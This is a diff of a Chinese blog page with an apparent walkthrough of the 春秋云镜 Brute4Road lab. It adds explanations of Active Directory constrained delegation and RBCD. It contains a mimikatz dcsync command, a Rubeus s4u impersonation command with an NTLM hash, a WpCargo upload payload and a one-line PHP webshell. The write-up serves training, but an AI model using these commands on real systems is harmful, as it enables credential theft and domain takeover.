@@ -699,7 +699,7 @@
 <p>tmd 账密test&#x2F;123456一连接说是密码过期了，得上linux rdesktop改下密码，但这不是我刚加的用户吗，重新创建了一个密码复杂一点的就登上了</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123837731.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123837731.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014123837731"></p>
 <p>flag03: flag{ae9d7830-0bbc-4a88-91e6-5f2b36b47aca}</p>
-<h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>传mimikatz上去，回到MDUT那个域用户，dump hash，记住一定要在域用户上抓hash而不是自己设置的工作组adminstrator</p>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>传mimikatz上去，回到MDUT那个域用户，dump hash，记住一定要在域用户上抓hash而不是自己设置的工作组adminstrator</p>
 <p>先尝试dcsync抓域控hash，报错没有dcsync权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;C:/Users/godown/Desktop/mimikatz.exe \&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv\&quot; exit&quot;</span><br></pre></td></tr></table></figure>
 
@@ -732,6 +732,46 @@
 <p>也可以直接读type \DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014133636689.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014133636689.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014133636689"></p>
 <p>flag04: flag{70da6fee-a107-440a-b6cb-8e56a69f0ed1}</p>
+<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="蚁剑CMDLINUX是什么？"><a href="#蚁剑CMDLINUX是什么？" class="headerlink" title="蚁剑CMDLINUX是什么？"></a>蚁剑CMDLINUX是什么？</h4><p>这个需要分析一下WpCargo注入的shell</p>
+<p>脚本通过&#x2F;wp-content&#x2F;plugins&#x2F;wpcargo&#x2F;includes&#x2F;barcode.php上传了一个二进制文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_payload = <span class="string">&#x27;x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据注释可以知道最后生成的shell为<code>&lt;?=$_GET[1]($_POST[2]);?&gt;</code></p>
+<p>还真找到了参考</p>
+<p><a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cq94cr90lnechd2431ng">https://rivers.chaitin.cn/blog/cq94cr90lnechd2431ng</a></p>
+<p>因为参数用的system而不是一句话常用的eval，蚁剑集成了system函数执行命令的webshell，就必须用CMDLinux</p>
+<p>所以这里改成1&#x3D;eval就能注入PHP类型吗？不行，因为eval本身不能作为变量传递，所以这里只能改Payload，至于这个没分析过漏洞，就不瞎BB了</p>
+<p>关于蚁剑的几种不常见的连接类型，简书有详细的叙述：</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a89ad062c017">https://www.jianshu.com/p/a89ad062c017</a></p>
+<h4 id="什么情况下可以通过Rebeus在有-CIFS-服务的约束性委派情况下申请到TGT"><a href="#什么情况下可以通过Rebeus在有-CIFS-服务的约束性委派情况下申请到TGT" class="headerlink" title="什么情况下可以通过Rebeus在有 CIFS 服务的约束性委派情况下申请到TGT"></a>什么情况下可以通过Rebeus在有 CIFS 服务的约束性委派情况下申请到TGT</h4><p>在约束性委派场景中，服务账户有一个特殊的属性</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关键属性：msDS-AllowedToActOnBehalfOfOtherIdentity</span></span><br><span class="line">msDS-AllowedToDelegateTo: CIFS/DC01.domain.com</span><br></pre></td></tr></table></figure>
+
+<p>如果攻击者控制了一个服务账户，服务账户配置了到 <code>CIFS</code> 服务的约束性委派，就能打Rebeus s4u，只不过刚好CIFS就是LDAP域控，打出的TGT票据就能直接拿下域控</p>
+<p>S4U2Self 允许：服务可以为<strong>任何用户</strong>请求访问<strong>自己</strong>的服务票据</p>
+<p>正常的S4U2Self请求如下</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154017378.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154017378.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014154017378"></p>
+<p>利用S4U2Proxy去代理服务</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154045134.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154045134.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014154045134"></p>
+<p>也就是利用S4U2Self获取ST，然后到处乱用这个ST，这个ST能请求其他服务的</p>
+<p>如果我们有一个配置了约束性委派的服务账户，并且该账户被允许委派到域控制器的LDAP服务，那么我们可以通过S4U2Self和S4U2Proxy获取域控制器LDAP服务的ST。然后，利用LDAP服务的ST，可以获取到黄金票据TGT。</p>
+<p>因此，整个攻击过程需要：</p>
+<ul>
+<li>一个配置了约束性委派的服务账户，并且该账户被允许委派到域控制器的LDAP（或CIFS，但CIFS不能直接用于DCSync，所以通常需要LDAP）服务。</li>
+<li>我们知道该服务账户的密码或哈希，以便获取该服务账户的TGT。</li>
+</ul>
+<p>然后，通过S4U2Proxy获取域控制器LDAP服务的ST，并使用该ST进一步获取TGT。</p>
+<p>Rubeus.exe完成了以上的全部部分，s4u参数也就是约束委派利用，最后得到域管的TGT</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:MSSQLSERVER$ /rc4:833b7fd6cd241c433efffde59363dbcf /domain:xiaorang.lab /impersonateuser:Administrator /msdsspn:cifs/DC.xiaorang.lab /nowrap /ptt</span><br></pre></td></tr></table></figure>
+
+<p>得到域管理员TGT保存到本地，就可以直接使用wmiexec.py no-pass或者直接访问域控了</p>
+<h4 id="委派攻击和RBCD攻击的组合"><a href="#委派攻击和RBCD攻击的组合" class="headerlink" title="委派攻击和RBCD攻击的组合"></a>委派攻击和RBCD攻击的组合</h4><p>delivery靶机也用到了约束委派攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># RBCD攻击的三个必要条件</span><br><span class="line">1. 对目标计算机/服务有&quot;Write&quot;权限</span><br><span class="line">2. 拥有一个有效的服务账户</span><br><span class="line">3. 目标服务运行在Windows Server 2012及以上版本</span><br></pre></td></tr></table></figure>
+
+<p>一般是GenericWrite权限作为条件</p>
+<p>delivery的一个普通靶机对域控有GenericWrite权限，利用RBCD在域控上创建新的服务账户，然后配置了RBCD，也就是修改了msDS-AllowedToActOnBehalfOfOtherIdentity属性</p>
+<p>接下来就是委派攻击了，利用RBCD创建的服务账户获取目标服务器的TGT，恰好目标就是LDAP域管，所以拿下域控。</p>
+<p>所以RBCD也就是个有Write权限下作为委派攻击的扩展，去为委派攻击创造条件</p>
+<p>只不过GenericWrite也就意味着可以向对象继续添加权限，完全可以利用GenericWrite 添加 DCSync 权限（脚本为Powerview），然后打DCSync，这是delivery有两解的原因</p>
 
       </div>
       <div class="post-tags-categories">
@@ -1008,7 +1048,7 @@ Thinkphp工具一把
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road"><span class="toc-text">春秋云镜 Brute4Road</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag04"><span class="toc-text">flag04</span></a></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road"><span class="toc-text">春秋云镜 Brute4Road</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-text">flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4"><span class="toc-text">flag4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-text">问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91CMDLINUX%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">蚁剑CMDLINUX是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87Rebeus%E5%9C%A8%E6%9C%89-CIFS-%E6%9C%8D%E5%8A%A1%E7%9A%84%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E6%83%85%E5%86%B5%E4%B8%8B%E7%94%B3%E8%AF%B7%E5%88%B0TGT"><span class="toc-text">什么情况下可以通过Rebeus在有 CIFS 服务的约束性委派情况下申请到TGT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%92%8CRBCD%E6%94%BB%E5%87%BB%E7%9A%84%E7%BB%84%E5%90%88"><span class="toc-text">委派攻击和RBCD攻击的组合</span></a></li></ol></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
